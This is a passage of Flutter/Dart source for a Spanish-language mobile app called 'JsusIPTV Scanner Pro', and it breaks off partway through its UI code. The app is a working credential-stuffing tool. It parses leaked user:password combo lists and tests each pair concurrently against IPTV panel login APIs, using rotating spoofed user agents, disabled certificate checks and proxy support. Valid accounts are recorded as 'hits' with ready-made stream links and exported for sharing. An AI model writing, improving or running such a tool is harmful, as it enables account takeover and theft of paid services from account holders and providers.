import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'dart:math';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:file_picker/file_picker.dart';
import 'package:share_plus/share_plus.dart';
import 'package:path_provider/path_provider.dart';

void main() => runApp(const JsusApp());

const cG = Color(0xFF00FF41);
const cG2 = Color(0xFF00C832);
const cCy = Color(0xFF00E5FF);
const cYe = Color(0xFFFFD600);
const cRe = Color(0xFFFF1744);
const cMg = Color(0xFFE040FB);
const cDg = Color(0xFF3A6B3A);
const cBg = Color(0xFF010301);
const cBg2 = Color(0xFF030803);
const cBr = Color(0xFF0A1F0A);

class ComboItem {
  final String user, pass;
  ComboItem(this.user, this.pass);
}

class PanelInfo {
  final int live, vod, series;
  PanelInfo(this.live, this.vod, this.series);
}

class HitItem {
  final String username, password, panel, expira, status, conex, activ, m3u, timezone;
  PanelInfo? panelInfo;
  final String id;
  HitItem({
    required this.username, required this.password, required this.panel,
    required this.expira, required this.status, required this.conex,
    required this.activ, required this.m3u, required this.timezone,
  }) : id = DateTime.now().millisecondsSinceEpoch.toString();
}

final _client = HttpClient()..badCertificateCallback = (_, __, ___) => true;

// ═══ PARSER ROBUSTO ═══
List<ComboItem> parseCombo(String text) {
  final lines = <ComboItem>[];
  final seen = <String>{};
  
  // Limpiar BOM y normalizar saltos de línea
  final clean = text
    .replaceAll('\uFEFF', '')
    .replaceAll('\r\n', '\n')
    .replaceAll('\r', '\n');
  
  for (final raw in clean.split('\n')) {
    // Limpiar espacios y caracteres invisibles
    final line = raw.trim()
      .replaceAll('\t', '')
      .replaceAll('\u0000', '')
      .replaceAll('\u00a0', '');
    
    // Saltar vacíos y comentarios
    if (line.isEmpty) continue;
    if (line.startsWith('#')) continue;
    if (line.startsWith('//')) continue;
    if (line.startsWith(';')) continue;
    
    // Debe tener ":"
    if (!line.contains(':')) continue;
    
    // Separar solo en el primer ":"
    final idx = line.indexOf(':');
    final user = line.substring(0, idx).trim();
    final pass = line.substring(idx + 1).trim();
    
    // Validar que no estén vacíos
    if (user.isEmpty || pass.isEmpty) continue;
    
    // Ignorar URLs
    if (user.toLowerCase().startsWith('http')) continue;
    if (user.toLowerCase().startsWith('www')) continue;
    if (user.contains('@')) continue;
    
    // Deduplicar
    final key = '${user.toLowerCase()}:$pass';
    if (seen.contains(key)) continue;
    seen.add(key);
    lines.add(ComboItem(user, pass));
  }
  return lines;
}

Future<Map<String, dynamic>?> checkAcc(String panel, String user, String pass, int tout) async {
  try {
    final url = '$panel/player_api.php?username=${Uri.encodeComponent(user)}&password=${Uri.encodeComponent(pass)}';
    final req = await _client.getUrl(Uri.parse(url));
    req.headers.set('User-Agent', _ua());
    req.headers.set('Accept', '*/*');
    req.headers.set('Connection', 'keep-alive');
    final res = await req.close().timeout(Duration(seconds: tout));
    if (res.statusCode >= 500) return null;
    final body = await res.transform(utf8.decoder).join();
    try {
      return jsonDecode(body) as Map<String, dynamic>;
    } catch (_) {
      if (body.contains('"auth":1') || body.contains('"status":"Active"') || body.contains('"status":"active"')) {
        return {'user_info': {'auth': 1, 'status': 'Active'}, 'server_info': {}};
      }
      return null;
    }
  } catch (_) { return null; }
}

Future<PanelInfo> verifyPanel(String panel, String user, String pass) async {
  try {
    final r = await Future.wait([
      _cnt(panel, user, pass, 'get_live_streams'),
      _cnt(panel, user, pass, 'get_vod_categories'),
      _cnt(panel, user, pass, 'get_series_categories'),
    ]);
    return PanelInfo(r[0], r[1], r[2]);
  } catch (_) { return PanelInfo(0, 0, 0); }
}

Future<int> _cnt(String panel, String user, String pass, String action) async {
  try {
    final url = '$panel/player_api.php?username=${Uri.encodeComponent(user)}&password=${Uri.encodeComponent(pass)}&action=$action';
    final req = await _client.getUrl(Uri.parse(url));
    req.headers.set('User-Agent', _ua());
    final res = await req.close().timeout(const Duration(seconds: 15));
    final body = await res.transform(utf8.decoder).join();
    final data = jsonDecode(body);
    if (data is List) return data.length;
  } catch (_) {}
  return 0;
}

const _uas = [
  'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 Chrome/120.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 12; SM-A536B) AppleWebKit/537.36 Chrome/119.0',
  'VLC/3.0.20 LibVLC/3.0.20', 'TiviMate/4.7.0', 'IPTVSmarters/3.1.5',
  'okhttp/4.12.0', 'ExoPlayer/2.19.1', 'Dalvik/2.1.0 (Linux; U; Android 13)',
  'Kodi/20.2 (Linux; Android 12.0)', 'IPTV Smarters Pro/3.0.9.5',
];
String _ua() => _uas[DateTime.now().millisecondsSinceEpoch % _uas.length];

// ═══ MATRIX PAINTER ═══
class MatrixPainter extends CustomPainter {
  final double progress;
  final List<List<int>> drops;
  final List<List<String>> chars;
  static const _chars = '0123456789ABCDEF日月火水木金土アイウエオカキクケコ';
  final _rnd = Random();

  MatrixPainter(this.progress, this.drops, this.chars);

  @override
  void paint(Canvas canvas, Size size) {
    final cols = (size.width / 14).floor();
    final rows = (size.height / 14).floor();
    final paint = Paint();

    for (var c = 0; c < min(cols, drops.length); c++) {
      for (var r = 0; r < min(rows, drops[c].length); r++) {
        final age = drops[c][r];
        if (age <= 0) continue;
        final opacity = (age / 20.0).clamp(0.0, 1.0);
        paint.color = (r == drops[c].length - 1
          ? Colors.white
          : cG).withOpacity(opacity * 0.4);
        final ch = chars[c][r];
        final tp = TextPainter(
          text: TextSpan(text: ch, style: TextStyle(color: paint.color, fontSize: 11, fontFamily: 'monospace')),
          textDirection: TextDirection.ltr,
        )..layout();
        tp.paint(canvas, Offset(c * 14.0, r * 14.0));
      }
    }
  }

  @override
  bool shouldRepaint(MatrixPainter old) => true;
}

class JsusApp extends StatelessWidget {
  const JsusApp({super.key});
  @override
  Widget build(BuildContext context) => MaterialApp(
    title: 'JsusIPTV',
    debugShowCheckedModeBanner: false,
    theme: ThemeData(
      scaffoldBackgroundColor: cBg,
      colorScheme: const ColorScheme.dark(primary: cG),
      fontFamily: 'monospace',
      sliderTheme: const SliderThemeData(
        activeTrackColor: cG, thumbColor: cG,
        inactiveTrackColor: cBr, overlayColor: Color(0x2200FF41),
      ),
    ),
    home: const HomeScreen(),
  );
}

class HomeScreen extends StatefulWidget {
  const HomeScreen({super.key});
  @override
  State<HomeScreen> createState() => _HS();
}

class _HS extends State<HomeScreen> with TickerProviderStateMixin {
  int _tab = 0;
  final _srvs = <String>[];
  String? _srv;
  final _combo = <ComboItem>[];
  String _cname = '';
  final _proxies = <String>[];
  final _hits = <HitItem>[];
  final _logs = <String>[];
  bool _scanning = false, _paused = false;
  int _checked = 0, _hn = 0, _fails = 0, _bans = 0, _total = 0;
  int _bots = 20, _tout = 10;
  DateTime? _t0;
  Timer? _timer;
  Timer? _matrixTimer;
  final _srvCtrl = TextEditingController();

  late AnimationController _glowAc;
  late Animation<double> _glow;
  late AnimationController _pulseAc;
  late Animation<double> _pulse;
  late AnimationController _scanLineAc;
  late Animation<double> _scanLine;

  // Matrix
  List<List<int>> _drops = [];
  List<List<String>> _chars = [];
  final _rnd = Random();
  static const _matChars = '0123456789ABCDEFアイウエオカキクケコ';

  @override
  void initState() {
    super.initState();
    _glowAc = AnimationController(vsync: this, duration: const Duration(seconds: 2))..repeat(reverse: true);
    _glow = Tween<double>(begin: 0.3, end: 1.0).animate(CurvedAnimation(parent: _glowAc, curve: Curves.easeInOut));

    _pulseAc = AnimationController(vsync: this, duration: const Duration(milliseconds: 800))..repeat(reverse: true);
    _pulse = Tween<double>(begin: 0.4, end: 1.0).animate(CurvedAnimation(parent: _pulseAc, curve: Curves.easeInOut));

    _scanLineAc = AnimationController(vsync: this, duration: const Duration(seconds: 3))..repeat();
    _scanLine = Tween<double>(begin: 0.0, end: 1.0).animate(_scanLineAc);

    _initMatrix(30, 60);
    _matrixTimer = Timer.periodic(const Duration(milliseconds: 80), (_) => _tickMatrix());
  }

  void _initMatrix(int cols, int rows) {
    _drops = List.generate(cols, (_) => List.generate(rows, (r) => _rnd.nextInt(20) - 20));
    _chars = List.generate(cols, (_) => List.generate(rows, (_) => _matChars[_rnd.nextInt(_matChars.length)]));
  }

  void _tickMatrix() {
    if (!mounted) return;
    setState(() {
      for (var c = 0; c < _drops.length; c++) {
        for (var r = _drops[c].length - 1; r >= 0; r--) {
          if (_drops[c][r] > 0) {
            _drops[c][r]--;
            if (_rnd.nextDouble() < 0.1) {
              _chars[c][r] = _matChars[_rnd.nextInt(_matChars.length)];
            }
          }
        }
        // New drop
        if (_rnd.nextDouble() < 0.05) {
          _drops[c][0] = 20;
          _chars[c][0] = _matChars[_rnd.nextInt(_matChars.length)];
        }
        // Cascade
        for (var r = _drops[c].length - 1; r > 0; r--) {
          if (_drops[c][r - 1] == 20 && _drops[c][r] == 0) {
            _drops[c][r] = 18;
            _chars[c][r] = _matChars[_rnd.nextInt(_matChars.length)];
          }
        }
      }
    });
  }

  @override
  void dispose() {
    _glowAc.dispose(); _pulseAc.dispose(); _scanLineAc.dispose();
    _timer?.cancel(); _matrixTimer?.cancel();
    super.dispose();
  }

  void _log(String m) {
    if (!mounted) return;
    setState(() {
      _logs.add('[${TimeOfDay.now().format(context)}] $m');
      if (_logs.length > 200) _logs.removeLast();
    });
  }

  void _toast(String m) => ScaffoldMessenger.of(context).showSnackBar(SnackBar(
    content: Row(children: [
      const Icon(Icons.terminal, color: cG, size: 14),
      const SizedBox(width: 8),
      Text(m, style: const TextStyle(color: cG, fontSize: 12, letterSpacing: 1)),
    ]),
    backgroundColor: const Color(0xFF050F05),
    duration: const Duration(seconds: 2),
    behavior: SnackBarBehavior.floating,
    shape: RoundedRectangleBorder(
      borderRadius: BorderRadius.circular(4),
      side: const BorderSide(color: cG, width: 1),
    ),
  ));

  Future<void> _loadCombo() async {
    final r = await FilePicker.platform.pickFiles(type: FileType.custom, allowedExtensions: ['txt']);
    if (r == null) return;
    final file = File(r.files.single.path!);
    final text = await file.readAsString();
    final parsed = parseCombo(text);
    setState(() { _combo.clear(); _combo.addAll(parsed); _cname = r.files.single.name; });
    _log('COMBO: ${r.files.single.name} — ${parsed.length} únicos de ${text.split('\n').length} líneas');
    _toast('✓ ${_fmt(parsed.length)} combos listos');
  }

  Future<void> _loadProxies() async {
    final r = await FilePicker.platform.pickFiles(type: FileType.custom, allowedExtensions: ['txt']);
    if (r == null) return;
    final text = await File(r.files.single.path!).readAsString();
    final lines = text.split('\n').map((l) => l.trim()).where((l) => l.isNotEmpty && l.contains(':')).toList();
    setState(() { _proxies.clear(); _proxies.addAll(lines); });
    _toast('✓ ${lines.length} proxies');
  }

  void _addSrv() {
    var url = _srvCtrl.text.trim();
    if (url.isEmpty) { _toast('⚠ Ingresa URL'); return; }
    if (!url.startsWith('http')) url = 'http://$url';
    url = url.replaceAll(RegExp(r'/+$'), '');
    if (_srvs.contains(url)) { _toast('Ya existe'); return; }
    setState(() { _srvs.add(url); _srv = url; });
    _srvCtrl.clear();
    _toast('✓ Agregado');
    _verifySrv(url);
  }

  Future<void> _verifySrv(String url) async {
    _log('SRV: Verificando $url...');
    try {
      final req = await _client.getUrl(Uri.parse('$url/player_api.php?username=test&password=test'));
      req.headers.set('User-Agent', _ua());
      final res = await req.close().timeout(const Duration(seconds: 6));
      if (res.statusCode < 500) {
        _log('SRV: ✓ ACTIVO (${res.statusCode}) — $url');
        _toast('✓ Servidor activo');
      } else {
        _log('SRV: ⚠ Responde con error ${res.statusCode}');
      }
    } catch (_) {
      _log('SRV: ✗ Sin respuesta — agregado de todas formas');
      _toast('⚠ Sin respuesta — agregado');
    }
  }

  Future<void> _startScan() async {
    if (_srv == null) { _toast('⚠ Configura servidor'); return; }
    if (_combo.isEmpty) { _toast('⚠ Carga combo'); return; }
    setState(() {
      _scanning = true; _paused = false;
      _checked = 0; _hn = 0; _fails = 0; _bans = 0;
      _total = _combo.length; _t0 = DateTime.now();
    });
    _log('▶ SCAN INICIADO — ${_fmt(_total)} combos — $_bots bots');
    _log('SRV: $_srv');
    _timer = Timer.periodic(const Duration(milliseconds: 300), (_) { if (mounted) setState(() {}); });
    final q = List<ComboItem>.from(_combo)..shuffle();
    await _runScan(q);
  }

  Future<void> _runScan(List<ComboItem> q) async {
    int pos = 0, active = 0;
    final done = Completer<void>();
    void chk() { if (_checked >= _total && active == 0 && !done.isCompleted) done.complete(); }

    Future<void> work(ComboItem item) async {
      while (_paused && _scanning) await Future.delayed(const Duration(milliseconds: 100));
      if (!_scanning) { active--; chk(); return; }

      final data = await checkAcc(_srv!, item.user, item.pass, _tout);
      if (mounted) setState(() => _checked++);

      if (data != null) {
        final ui = (data['user_info'] as Map?) ?? {};
        final si = (data['server_info'] as Map?) ?? {};
        final auth = ui['auth'];
        final st = ui['status']?.toString().toLowerCase().trim() ?? '';
        final ok = auth == 1 || auth == '1' || auth == true ||
          ['active','activo','enabled','1','premium','trial','free','Active'].contains(st) ||
          ui['auth'].toString() == '1';

        if (ok && st != 'banned' && st != 'disabled' && st != 'expired') {
          String exp = 'Ilimitado';
          final ts = ui['exp_date'];
          if (ts != null) {
            final n = int.tryParse(ts.toString());
            if (n != null && n > 0) {
              exp = DateTime.fromMillisecondsSinceEpoch(n * 1000).toString().split(' ')[0];
            }
          }
          final hit = HitItem(
            username: item.user, password: item.pass, panel: _srv!,
            expira: exp,
            status: ui['status']?.toString() ?? 'Active',
            conex: ui['max_connections']?.toString() ?? '?',
            activ: ui['active_cons']?.toString() ?? '0',
            m3u: '$_srv/get.php?username=${Uri.encodeComponent(item.user)}&password=${Uri.encodeComponent(item.pass)}&type=m3u_plus',
            timezone: si['timezone']?.toString() ?? '',
          );
          if (mounted) setState(() { _hits.insert(0, hit); _hn++; });
          _log('🎯 HIT #$_hn: ${item.user} → EXP: $exp');
          verifyPanel(_srv!, item.user, item.pass).then((info) {
            if (mounted) setState(() => hit.panelInfo = info);
            _log('📊 PANEL: ${item.user} 📺${info.live} 🎬${info.vod} 📺${info.series}');
          });
        } else {
          if (mounted) setState(() => _fails++);
        }
      } else {
        if (mounted) setState(() => _fails++);
      }

      final br = _bans / (_checked > 0 ? _checked : 1);
      await Future.delayed(Duration(milliseconds: br > 0.3 ? 200 : br > 0.1 ? 60 : 5));
      active--; chk();
    }

    while (pos < q.length && _scanning) {
      if (active < _bots && !_paused) { active++; work(q[pos++]); }
      else await Future.delayed(const Duration(milliseconds: 15));
    }

    await done.future.timeout(const Duration(hours: 24), onTimeout: () {});
    _timer?.cancel();
    if (mounted) setState(() => _scanning = false);
    _log('✓ FIN — Hits: $_hn | Fail: $_fails | Bans: $_bans');
    _toast('✓ Finalizado — $_hn HITs');
  }

  Future<void> _export() async {
    if (_hits.isEmpty) { _toast('No hay hits'); return; }
    final sep = '=' * 56;
    final buf = StringBuffer('JsusIPTV Scanner Pro — HITS\n$sep\n\n');
    for (var i = 0; i < _hits.length; i++) {
      final h = _hits[i];
      buf.writeln('HIT #${i + 1}');
      buf.writeln('USER   : ${h.username}');
      buf.writeln('PASS   : ${h.password}');
      buf.writeln('SERVER : ${h.panel}');
      buf.writeln('EXPIRA : ${h.expira}');
      buf.writeln('CONEX  : ${h.activ}/${h.conex}');
      buf.writeln('ESTADO : ${h.status}');
      if (h.timezone.isNotEmpty) buf.writeln('ZONA   : ${h.timezone}');
      if (h.panelInfo != null) {
        buf.writeln('CANALES: ${h.panelInfo!.live}');
        buf.writeln('VOD    : ${h.panelInfo!.vod}');
        buf.writeln('SERIES : ${h.panelInfo!.series}');
      }
      buf.writeln('M3U    : ${h.m3u}');
      buf.writeln('${'─' * 40}\n');
    }
    final dir = await getExternalStorageDirectory();
    final file = File('${dir!.path}/JsusIPTV_${DateTime.now().toIso8601String().split('T')[0]}.txt');
    await file.writeAsString(buf.toString());
    await Share.shareXFiles([XFile(file.path)]);
    _toast('✓ ${_hits.length} hits exportados');
  }

  String get _elapsed {
    if (_t0 == null) return '00:00:00';
    final d = DateTime.now().difference(_t0!);
    return '${d.inHours.toString().padLeft(2, '0')}:${(d.inMinutes % 60).toString().padLeft(2, '0')}:${(d.inSeconds % 60).toString().padLeft(2, '0')}';
  }

  int get _cpm {
    if (_t0 == null || _checked == 0) return 0;
    final s = DateTime.now().difference(_t0!).inSeconds;
    return s > 0 ? (_checked / s * 60).round() : 0;
  }

  double get _pct => _total > 0 ? _checked / _total : 0;

  String _fmt(int n) {
    final s = n.toString();
    final buf = StringBuffer();
    for (var i = 0; i < s.length; i++) {
      if (i > 0 && (s.length - i) % 3 == 0) buf.write(',');
      buf.write(s[i]);
    }
    return buf.toString();
  }

  String _fn(int n) => n >= 1000 ? '${(n / 1000).toStringAsFixed(1)}k' : '$n';

  Color _lc(String l) {
    if (l.contains('HIT') || l.contains('🎯')) return cG;
    if (l.contains('FAIL') || l.contains('✗')) return cRe;
    if (l.contains('WARN') || l.contains('PAUS') || l.contains('⚠')) return cYe;
    if (l.contains('PANEL') || l.contains('SRV') || l.contains('📊')) return cCy;
    if (l.contains('FIN') || l.contains('✓')) return cG;
    return cDg;
  }

  @override
  Widget build(BuildContext context) => Scaffold(
    backgroundColor: cBg,
    body: Stack(children: [
      // Matrix background
      Positioned.fill(child: CustomPaint(
        painter: MatrixPainter(_scanLine.value, _drops, _chars),
      )),
      // Vignette
      Positioned.fill(child: Container(
        decoration: const BoxDecoration(
          gradient: RadialGradient(
            center: Alignment.center, radius: 1.2,
            colors: [Colors.transparent, Color(0xCC000000)],
          ),
        ),
      )),
      // Scanline overlay
      Positioned.fill(child: AnimatedBuilder(
        animation: _scanLine,
        builder: (_, __) => CustomPaint(painter: _ScanLinePainter(_scanLine.value)),
      )),
      // Content
      SafeArea(child: Column(children: [
        _hdr(), _nav(),
        Expanded(child: _body()),
      ])),
    ]),
  );

  Widget _hdr() => Container(
    padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 10),
    decoration: BoxDecoration(
      color: cBg2.withOpacity(0.92),
      border: Border(bottom: BorderSide(color: cBr)),
      boxShadow: [BoxShadow(color: cG.withOpacity(0.05), blurRadius: 20, spreadRadius: -5)],
    ),
    child: Row(children: [
      // Icon with glow
      AnimatedBuilder(animation: _glow, builder: (_, __) => Container(
        width: 42, height: 42,
        decoration: BoxDecoration(
          borderRadius: BorderRadius.circular(10),
          border: Border.all(color: cG.withOpacity(0.4), width: 1.5),
          boxShadow: [BoxShadow(color: cG.withOpacity(_glow.value * 0.3), blurRadius: 15, spreadRadius: 1)],
        ),
        child: ClipRRect(
          borderRadius: BorderRadius.circular(9),
          child: Image.asset('android-icon/icon.png',
            errorBuilder: (_, __, ___) => Container(
              color: cBg2,
              child: const Center(child: Text('Js', style: TextStyle(color: cG, fontSize: 14, fontWeight: FontWeight.bold))),
            )),
        ),
      )),
      const SizedBox(width: 12),
      Expanded(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
        AnimatedBuilder(animation: _glow, builder: (_, __) => ShaderMask(
          shaderCallback: (bounds) => LinearGradient(colors: [cCy, cG, cCy]).createShader(bounds),
          child: const Text('JsusIPTV Scanner', style: TextStyle(
            fontSize: 17, fontWeight: FontWeight.bold, letterSpacing: 1.5,
            color: Colors.white,
          )),
        )),
        Text('PRO v5.0  ·  POTENCIA  ·  PRECISION  ·  VELOCIDAD',
          style: TextStyle(fontSize: 7.5, color: cDg.withOpacity(0.8), letterSpacing: 1.5)),
      ])),
      Column(crossAxisAlignment: CrossAxisAlignment.end, children: [
        AnimatedBuilder(animation: _pulse, builder: (_, __) => Container(
          padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
          decoration: BoxDecoration(
            color: (_scanning ? cG : cRe).withOpacity(0.08),
            borderRadius: BorderRadius.circular(20),
            border: Border.all(color: (_scanning ? cG : cRe).withOpacity(0.4)),
            boxShadow: [BoxShadow(
              color: (_scanning ? cG : cRe).withOpacity(_scanning ? _pulse.value * 0.3 : 0.1),
              blurRadius: 10,
            )],
          ),
          child: Row(mainAxisSize: MainAxisSize.min, children: [
            Container(width: 6, height: 6, decoration: BoxDecoration(
              shape: BoxShape.circle,
              color: _scanning ? cG : cRe,
              boxShadow: [BoxShadow(color: (_scanning ? cG : cRe).withOpacity(_pulse.value), blurRadius: 6)],
            )),
            const SizedBox(width: 5),
            Text(_scanning ? 'SCAN' : 'IDLE',
              style: TextStyle(fontSize: 9, color: _scanning ? cG : cRe, letterSpacing: 1.5, fontWeight: FontWeight.bold)),
          ]),
        )),
        const SizedBox(height: 3),
        StreamBuilder(
          stream: Stream.periodic(const Duration(seconds: 1)),
          builder: (_, __) => Text(TimeOfDay.now().format(context),
            style: TextStyle(fontSize: 9, color: cDg.withOpacity(0.8), letterSpacing: 1)),
        ),
      ]),
    ]),
  );

  Widget _nav() {
    const tabs = [('⚡', 'SCAN'), ('⚙️', 'CONFIG'), ('🎯', 'HITS'), ('🔗', 'PROXY')];
    return Container(
      decoration: BoxDecoration(
        color: cBg2.withOpacity(0.9),
        border: Border(bottom: BorderSide(color: cBr)),
      ),
      child: Row(children: List.generate(4, (i) {
        final active = _tab == i;
        return Expanded(child: GestureDetector(
          onTap: () => setState(() => _tab = i),
          child: AnimatedContainer(
            duration: const Duration(milliseconds: 200),
            padding: const EdgeInsets.symmetric(vertical: 9),
            decoration: BoxDecoration(
              color: active ? cG.withOpacity(0.05) : Colors.transparent,
              border: Border(bottom: BorderSide(color: active ? cG : Colors.transparent, width: 2)),
            ),
            child: Column(mainAxisSize: MainAxisSize.min, children: [
              Text(tabs[i].$1, style: TextStyle(fontSize: 16, shadows: active ? [const Shadow(color: cG, blurRadius: 10)] : null)),
              const SizedBox(height: 2),
              Text(tabs[i].$2, style: TextStyle(
                fontSize: 9, fontWeight: FontWeight.bold, letterSpacing: 1.5,
                color: active ? cG : cDg,
                shadows: active ? [const Shadow(color: cG, blurRadius: 8)] : null,
              )),
            ]),
          ),
        ));
      })),
    );
  }

  Widget _body() {
    switch (_tab) {
      case 0: return _scanTab();
      case 1: return _cfgTab();
      case 2: return _hitsTab();
      case 3: return _proxyTab();
      default: return _scanTab();
    }
  }

  Widget _scanTab() => ListView(padding: const EdgeInsets.all(10), children: [
    if (_scanning) ...[
      _card(ac: cG, child: Column(children: [
        Row(mainAxisAlignment: MainAxisAlignment.spaceBetween, children: [
          _rbadge(),
          Container(
            padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
            decoration: BoxDecoration(
              color: cBg, borderRadius: BorderRadius.circular(4),
              border: Border.all(color: cBr)),
            child: Text(_elapsed, style: const TextStyle(fontSize: 11, color: cCy, fontFamily: 'monospace', letterSpacing: 1)),
          ),
        ]),
        const SizedBox(height: 12),
        // Progress
        Column(children: [
          Row(mainAxisAlignment: MainAxisAlignment.spaceBetween, children: [
            Text('${(_pct * 100).toStringAsFixed(1)}%',
              style: const TextStyle(fontSize: 16, color: cG, fontFamily: 'monospace',
                fontWeight: FontWeight.bold,
                shadows: [Shadow(color: cG, blurRadius: 12)])),
            Text('${_fmt(_checked)} / ${_fmt(_total)}',
              style: TextStyle(fontSize: 9, color: cDg, letterSpacing: 1)),
          ]),
          const SizedBox(height: 8),
          Stack(children: [
            Container(height: 8, decoration: BoxDecoration(
              color: cBr, borderRadius: BorderRadius.circular(4))),
            AnimatedContainer(
              duration: const Duration(milliseconds: 300),
              height: 8,
              width: MediaQuery.of(context).size.width * _pct * 0.88,
              decoration: BoxDecoration(
                borderRadius: BorderRadius.circular(4),
                gradient: const LinearGradient(colors: [Color(0xFF004D18), cG2, cG]),
                boxShadow: [BoxShadow(color: cG.withOpacity(0.5), blurRadius: 8)],
              ),
            ),
          ]),
        ]),
        const SizedBox(height: 12),
        Row(children: [
          Expanded(child: _sbox('HITS', '$_hn', cG)),
          const SizedBox(width: 8),
          Expanded(child: _sbox('FAIL', _fmt(_fails), cRe)),
          const SizedBox(width: 8),
          Expanded(child: _sbox('BANS', '$_bans', cYe)),
        ]),
        const SizedBox(height: 8),
        _cpmBox(),
        const SizedBox(height: 12),
        Row(children: [
          Expanded(child: _btn(
            _paused ? '▶ REANUDAR' : '⏸ PAUSAR',
            c: _paused ? cG : cYe,
            onTap: () => setState(() => _paused = !_paused))),
          const SizedBox(width: 8),
          Expanded(child: _btn('⬛ DETENER', c: cRe,
            onTap: () { setState(() => _scanning = false); _timer?.cancel(); })),
        ]),
      ])),
    ] else ...[
      _card(ac: cCy, child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
        _ct('SERVIDOR ACTIVO'),
        Row(children: [
          Container(width: 8, height: 8, decoration: BoxDecoration(
            shape: BoxShape.circle,
            color: _srv != null ? cG : cRe,
            boxShadow: [BoxShadow(color: (_srv != null ? cG : cRe).withOpacity(0.6), blurRadius: 6)],
          )),
          const SizedBox(width: 8),
          Expanded(child: Text(_srv ?? 'Sin servidor configurado',
            style: TextStyle(fontSize: 11, color: _srv != null ? cCy : cDg),
            overflow: TextOverflow.ellipsis)),
        ]),
        const SizedBox(height: 10),
        _sbtn('⚙ CONFIGURAR', c: cCy, onTap: () => setState(() => _tab = 1)),
      ])),
      _card(ac: cYe, child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
        _ct('COMBO'),
        Row(children: [
          Container(width: 8, height: 8, decoration: BoxDecoration(
            shape: BoxShape.circle,
            color: _combo.isEmpty ? cRe : cG,
            boxShadow: [BoxShadow(color: (_combo.isEmpty ? cRe : cG).withOpacity(0.6), blurRadius: 6)],
          )),
          const SizedBox(width: 8),
          Expanded(child: Text(
            _combo.isEmpty ? 'Sin combo cargado' : '$_cname — ${_fmt(_combo.length)} únicos',
            style: TextStyle(fontSize: 11, color: _combo.isEmpty ? cDg : cYe),
            overflow: TextOverflow.ellipsis,
          )),
        ]),
        const SizedBox(height: 10),
        _sbtn('📂 CARGAR COMBO', c: cYe, onTap: _loadCombo),
      ])),
      _card(child: Column(children: [
        _ct('CONFIGURACIÓN'),
        Row(mainAxisAlignment: MainAxisAlignment.spaceBetween, children: [
          const Text('BOTS SIMULTÁNEOS', style: TextStyle(fontSize: 9, color: cDg, letterSpacing: 2)),
          AnimatedBuilder(animation: _glow, builder: (_, __) => Text('$_bots',
            style: TextStyle(fontSize: 20, color: cG, fontFamily: 'monospace',
              fontWeight: FontWeight.bold,
              shadows: [Shadow(color: cG.withOpacity(_glow.value), blurRadius: 12)]))),
        ]),
        const SizedBox(height: 4),
        Slider(value: _bots.toDouble(), min: 1, max: 100,
          onChanged: (v) => setState(() => _bots = v.round())),
        const SizedBox(height: 4),
        Row(children: [
          Expanded(child: _ibox('PROXY', _proxies.isEmpty ? 'Directo' : '${_proxies.length} px', cMg)),
          const SizedBox(width: 8),
          Expanded(child: _ibox('TIMEOUT', '${_tout}s', cCy)),
          const SizedBox(width: 8),
          Expanded(child: _ibox('MODO', 'Nativo', cG)),
        ]),
      ])),
      _card(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
        _ct('LOG DEL SISTEMA'),
        Container(
          height: 110,
          decoration: BoxDecoration(
            color: const Color(0xFF010201),
            borderRadius: BorderRadius.circular(4),
            border: Border.all(color: cBr),
          ),
          child: ListView.builder(
            padding: const EdgeInsets.all(6),
            itemCount: _logs.length,
            itemBuilder: (_, i) => Padding(
              padding: const EdgeInsets.only(bottom: 1),
              child: Text(_logs[i], style: TextStyle(fontSize: 9, color: _lc(_logs[i]), height: 1.6,
                fontFamily: 'monospace')),
            ),
          ),
        ),
      ])),
      const SizedBox(height: 4),
      _bigBtn('⚡ INICIAR ESCANEO', onTap: _startScan),
    ],
  ]);

  Widget _cfgTab() => ListView(padding: const EdgeInsets.all(10), children: [
    _sec('SERVIDOR IPTV'),
    _card(ac: cCy, child: Column(children: [
      _ct('AGREGAR SERVIDOR'),
      TextField(
        controller: _srvCtrl,
        style: const TextStyle(color: cG, fontSize: 12, fontFamily: 'monospace'),
        decoration: InputDecoration(
          hintText: 'http://panel.com:8080',
          hintStyle: TextStyle(color: cDg.withOpacity(0.6), fontSize: 12),
          filled: true, fillColor: Colors.black54,
          prefixIcon: const Icon(Icons.dns, color: cDg, size: 18),
          border: OutlineInputBorder(borderRadius: BorderRadius.circular(4), borderSide: const BorderSide(color: cBr)),
          enabledBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(4), borderSide: const BorderSide(color: cBr)),
          focusedBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(4), borderSide: const BorderSide(color: cG, width: 1.5)),
          contentPadding: const EdgeInsets.symmetric(horizontal: 10, vertical: 10),
        ),
      ),
      const SizedBox(height: 10),
      _btn('🔍 VERIFICAR Y AGREGAR', c: cCy, onTap: _addSrv),
      if (_srvs.isNotEmpty) ...[
        _sec('SERVIDORES ACTIVOS'),
        ..._srvs.asMap().entries.map((e) => AnimatedContainer(
          duration: const Duration(milliseconds: 300),
          margin: const EdgeInsets.only(bottom: 6),
          padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 8),
          decoration: BoxDecoration(
            color: cBg,
            borderRadius: BorderRadius.circular(4),
            border: Border.all(color: e.value == _srv ? cCy.withOpacity(0.4) : cBr),
            boxShadow: e.value == _srv ? [BoxShadow(color: cCy.withOpacity(0.1), blurRadius: 8)] : null,
          ),
          child: Row(children: [
            Container(width: 6, height: 6, decoration: const BoxDecoration(
              shape: BoxShape.circle, color: cG,
              boxShadow: [BoxShadow(color: cG, blurRadius: 4)],
            )),
            const SizedBox(width: 8),
            Expanded(child: Text(e.value, style: const TextStyle(fontSize: 10, color: cCy),
              overflow: TextOverflow.ellipsis)),
            GestureDetector(
              onTap: () => setState(() {
                _srvs.removeAt(e.key);
                _srv = _srvs.isNotEmpty ? _srvs[0] : null;
              }),
              child: Container(
                padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
                decoration: BoxDecoration(
